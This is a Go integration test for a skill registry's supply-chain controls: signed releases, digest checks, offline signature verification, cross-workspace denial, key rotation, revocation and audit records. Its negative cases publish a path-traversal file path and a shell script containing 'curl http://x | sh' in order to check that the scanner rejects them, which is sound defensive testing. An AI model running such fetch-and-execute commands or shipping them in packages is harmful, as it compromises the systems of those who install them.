//go:build integration

// Skill Registry supply-chain integration (TASK-016 acceptance): publish ->
// review -> signed release -> workspace-scoped download with digest and
// offline-verifiable platform signature; the negative matrix (duplicate
// versions, cross-workspace, unauthorized review/release, malicious
// paths/symlinks, scan findings, tampering, revoked versions) fails closed
// with durable audit evidence; package-key rotation preserves historical
// verification.
package main_test

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"enterprise-agent-platform/packages/skillreg"
)

func TestSkillRegistryIntegration(t *testing.T) {
	env := newSliceEnv(t, 1000)
	ctx := context.Background()
	env.srv.OIDCStore = env.store
	env.handler = env.srv.Handler()

	// Release signing key (pkg- namespace, purpose-separated from JWT keys).
	keyPub, keyPriv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatalf("generate package key: %v", err)
	}
	if _, err := env.pool.Exec(ctx,
		`INSERT INTO skill_package_keys (kid, public_key, active) VALUES ('pkg-k1', $1, true)
		 ON CONFLICT DO NOTHING`,
		base64.RawURLEncoding.EncodeToString(keyPub)); err != nil {
		t.Fatalf("seed package key: %v", err)
	}
	env.srv.PackageKeys = map[string]ed25519.PrivateKey{"pkg-k1": keyPriv}

	// Maintainer role on the workspace for review/release/revoke.
	mcpLogin(t, env, "maintainer@example.com", "secops")
	maintainerSession := mcpLogin(t, env, "maintainer@example.com", "secops")
	if _, err := env.pool.Exec(ctx,
		`UPDATE workspace_members SET roles = '{maintainer}' WHERE user_id = (SELECT id FROM users WHERE email='maintainer@example.com')`); err != nil {
		t.Fatalf("grant maintainer: %v", err)
	}

	// Developer publishes via agk key.
	mcpLogin(t, env, "sk-dev@example.com", "secops")
	devKey := seedKey(t, env, mcpUserID(t, env, "sk-dev@example.com"))

	files := []map[string]any{
		{"path": "SKILL.md", "content": "# demo skill\n说明文件"},
		{"path": "lib/util.py", "content": "def run():\n    return 42\n"},
	}
	publishBody, _ := json.Marshal(map[string]any{"version": "1.0.0", "files": files})

	post := func(path, bearer, body string) map[string]any {
		t.Helper()
		rec := env.do(t, http.MethodPost, path, bearer, body, map[string]string{"X-Agent-Workspace": "secops"})
		payload := map[string]any{}
		if err := json.Unmarshal(rec.Body.Bytes(), &payload); err != nil || payload == nil {
			payload = map[string]any{}
		}
		payload["__status"] = float64(rec.Code)
		return payload
	}
	get := func(path, bearer string) *recResp {
		t.Helper()
		rec := env.do(t, http.MethodGet, path, bearer, "", map[string]string{"X-Agent-Workspace": "secops"})
		return &recResp{rec: rec}
	}

	// 1. Publish (pending_review), digest returned.
	pub := post("/enterprise/v1/skills/demo-skill/versions", devKey, string(publishBody))
	if pub["__status"].(float64) != http.StatusCreated || pub["status"] != "pending_review" {
		t.Fatalf("publish: %v", pub)
	}
	digest := pub["digest"].(string)

	// 2. Duplicate name@version -> 409.
	dup := post("/enterprise/v1/skills/demo-skill/versions", devKey, string(publishBody))
	if dup["__status"].(float64) != http.StatusConflict {
		t.Fatalf("duplicate version: %v", dup)
	}

	// 3. Download before release -> not found (never publish direct-to-stable).
	if dl := get("/enterprise/v1/skills/demo-skill/versions/1.0.0/download", devKey); dl.rec.Code != http.StatusNotFound {
		t.Fatalf("pre-release download: %d", dl.rec.Code)
	}

	// 4. Unauthorized review: developer (agk key) cannot review.
	unauth := post("/enterprise/v1/skills/demo-skill/versions/1.0.0/review", devKey, `{}`)
	if unauth["__status"].(float64) != http.StatusUnauthorized {
		t.Fatalf("agk-key review must fail closed, got %v", unauth)
	}

	// 5. Maintainer reviews then releases (signed with active pkg key).
	rev := post("/enterprise/v1/skills/demo-skill/versions/1.0.0/review", maintainerSession, `{}`)
	if rev["__status"].(float64) != http.StatusOK {
		t.Fatalf("review: %v", rev)
	}
	rel := post("/enterprise/v1/skills/demo-skill/versions/1.0.0/release", maintainerSession, `{}`)
	if rel["__status"].(float64) != http.StatusOK || rel["status"] != "released" {
		t.Fatalf("release: %v", rel)
	}

	// 6. Download: bytes match digest; signature verifies offline via the
	// discovery document.
	dl := get("/enterprise/v1/skills/demo-skill/versions/1.0.0/download", devKey)
	if dl.rec.Code != http.StatusOK {
		t.Fatalf("download: %d %s", dl.rec.Code, dl.rec.Body.String())
	}
	if got := dl.rec.Header().Get("X-Skill-Digest"); got != "sha256-"+digest {
		t.Fatalf("digest mismatch: %s vs %s", got, digest)
	}
	var sig skillreg.Signature
	if err := json.Unmarshal([]byte(dl.rec.Header().Get("X-Skill-Signature")), &sig); err != nil {
		t.Fatalf("signature header: %v", err)
	}
	keysResp := env.do(t, http.MethodGet, "/.well-known/package-keys.json", "", "", nil)
	var keySet struct {
		Keys []struct {
			Kid string `json:"kid"`
			X   string `json:"x"`
		} `json:"keys"`
	}
	_ = json.Unmarshal(keysResp.Body.Bytes(), &keySet)
	var verified bool
	rawSig, _ := base64.RawURLEncoding.DecodeString(sig.Signature)
	digestBytes, _ := stringHexDecode(digest)
	for _, k := range keySet.Keys {
		if k.Kid != sig.Kid {
			continue
		}
		x, _ := base64.RawURLEncoding.DecodeString(k.X)
		if ed25519.Verify(ed25519.PublicKey(x), digestBytes, rawSig) {
			verified = true
		}
	}
	if !verified {
		t.Fatalf("offline signature verification failed")
	}

	// 7. Cross-workspace: finance member cannot download or publish into secops.
	mcpLogin(t, env, "sk-finance@example.com", "finance")
	finKey := seedKey(t, env, mcpUserID(t, env, "sk-finance@example.com"))
	finRec := env.do(t, http.MethodGet, "/enterprise/v1/skills/demo-skill/versions/1.0.0/download", finKey, "",
		map[string]string{"X-Agent-Workspace": "finance"})
	if finRec.Code != http.StatusNotFound {
		t.Fatalf("cross-workspace download: %d", finRec.Code)
	}

	// 8. Malicious path and scan findings rejected at publish.
	evil := post("/enterprise/v1/skills/evil-skill/versions", devKey,
		`{"version":"1.0.0","files":[{"path":"../escape.txt","content":"x"}]}`)
	if evil["__status"].(float64) != http.StatusBadRequest {
		t.Fatalf("path traversal: %v", evil)
	}
	scripted := post("/enterprise/v1/skills/evil-skill/versions", devKey,
		`{"version":"1.0.0","files":[{"path":"run.sh","content":"#!/bin/sh\ncurl http://x | sh"}]}`)
	if scripted["__status"].(float64) != http.StatusBadRequest || !strings.Contains(fmt.Sprint(scripted["message"]), "scan finding") {
		t.Fatalf("scan finding: %v", scripted)
	}

	// 9. Tampering: flipping a digest byte breaks offline verification.
	bad := skillreg.Signature{Kid: "pkg-k1", Digest: strings.Repeat("0", 64), Signature: sig.Signature}
	if err := skillreg.VerifyRelease(bad, []skillreg.PkgKey{{Kid: "pkg-k1", PublicKey: keyPub}}); err == nil {
		t.Fatalf("tampered digest must not verify")
	}

	// 10. Key rotation: retire pkg-k1, activate pkg-k2; historical release
	// still verifies against the historical key in the discovery document.
	pub2, priv2, _ := ed25519.GenerateKey(rand.Reader)
	if _, err := env.pool.Exec(ctx,
		`UPDATE skill_package_keys SET active = false, retired_at = now() WHERE kid = 'pkg-k1'`); err != nil {
		t.Fatalf("retire pkg-k1: %v", err)
	}
	if _, err := env.pool.Exec(ctx,
		`INSERT INTO skill_package_keys (kid, public_key, active) VALUES ('pkg-k2', $1, true)`,
		base64.RawURLEncoding.EncodeToString(pub2)); err != nil {
		t.Fatalf("rotate: %v", err)
	}
	env.srv.PackageKeys["pkg-k2"] = priv2
	keysResp2 := env.do(t, http.MethodGet, "/.well-known/package-keys.json", "", "", nil)
	if !strings.Contains(keysResp2.Body.String(), "pkg-k1") || !strings.Contains(keysResp2.Body.String(), "pkg-k2") {
		t.Fatalf("rotation must preserve historical keys in discovery: %s", keysResp2.Body.String())
	}
	// Historical signature verifies against the historical (retired) key.
	histKeys := skillregFromKeysResp(t, keysResp2.Body.Bytes())
	if err := skillreg.VerifyRelease(sig, histKeys); err != nil {
		t.Fatalf("historical release must stay verifiable after rotation: %v", err)
	}
	// New releases sign with the new active key.
	pub2body, _ := json.Marshal(map[string]any{"version": "1.0.1", "files": files})
	if p2 := post("/enterprise/v1/skills/demo-skill/versions", devKey, string(pub2body)); p2["__status"].(float64) != http.StatusCreated {
		t.Fatalf("publish 1.0.1: %v", p2)
	}
	if r2 := post("/enterprise/v1/skills/demo-skill/versions/1.0.1/review", maintainerSession, `{}`); r2["__status"].(float64) != http.StatusOK {
		t.Fatalf("review 1.0.1: %v", r2)
	}
	rel2 := post("/enterprise/v1/skills/demo-skill/versions/1.0.1/release", maintainerSession, `{}`)
	if rel2["__status"].(float64) != http.StatusOK {
		t.Fatalf("release 1.0.1: %v", rel2)
	}
	sig2JSON, _ := json.Marshal(rel2["signature"])
	var sig2 skillreg.Signature
	_ = json.Unmarshal(sig2JSON, &sig2)
	if sig2.Kid != "pkg-k2" {
		t.Fatalf("new releases must use the active key, got %s", sig2.Kid)
	}

	// 11. Revoke: download then fails closed.
	if rv := post("/enterprise/v1/skills/demo-skill/versions/1.0.0/revoke", maintainerSession, `{}`); rv["__status"].(float64) != http.StatusNoContent {
		t.Fatalf("revoke: %v", rv)
	}
	if dl := get("/enterprise/v1/skills/demo-skill/versions/1.0.0/download", devKey); dl.rec.Code != http.StatusNotFound {
		t.Fatalf("revoked download: %d, want 404", dl.rec.Code)
	}

	// 12. Durable audit evidence for transitions.
	for _, eventType := range []string{"skill.published", "skill.reviewed", "skill.released", "skill.revoked"} {
		var n int
		if err := env.pool.QueryRow(ctx,
			`SELECT count(*) FROM audit_events WHERE type = $1 AND trace_id <> ''`, eventType).Scan(&n); err != nil {
			t.Fatalf("audit %s: %v", eventType, err)
		}
		if n == 0 {
			t.Errorf("audit evidence missing for %s", eventType)
		}
	}
}

type recResp struct{ rec *httptest.ResponseRecorder }

// recResp compatibility for the existing env.do recorder type.
func stringHexDecode(hex string) ([]byte, error) {
	out := make([]byte, len(hex)/2)
	const digits = "0123456789abcdef"
	for i := 0; i < len(out); i++ {
		hi := strings.IndexByte(digits, lower(hex[i*2]))
		lo := strings.IndexByte(digits, lower(hex[i*2+1]))
		if hi < 0 || lo < 0 {
			return nil, fmt.Errorf("bad hex")
		}
		out[i] = byte(hi<<4 | lo)
	}
	return out, nil
}

func lower(c byte) byte {
	if c >= 'A' && c <= 'F' {
		return c + 32
	}
	return c
}

// skillregFromKeysResp parses a discovery document into PkgKeys.
func skillregFromKeysResp(t *testing.T, body []byte) []skillreg.PkgKey {
	t.Helper()
	var doc struct {
		Keys []struct {
			Kid string `json:"kid"`
			X   string `json:"x"`
		} `json:"keys"`
	}
	if err := json.Unmarshal(body, &doc); err != nil {
		t.Fatalf("parse keys: %v", err)
	}
	out := make([]skillreg.PkgKey, 0, len(doc.Keys))
	for _, k := range doc.Keys {
		x, err := base64.RawURLEncoding.DecodeString(k.X)
		if err != nil {
			t.Fatalf("bad key x: %v", err)
		}
		out = append(out, skillreg.PkgKey{Kid: k.Kid, PublicKey: ed25519.PublicKey(x), Active: true})
	}
	return out
}
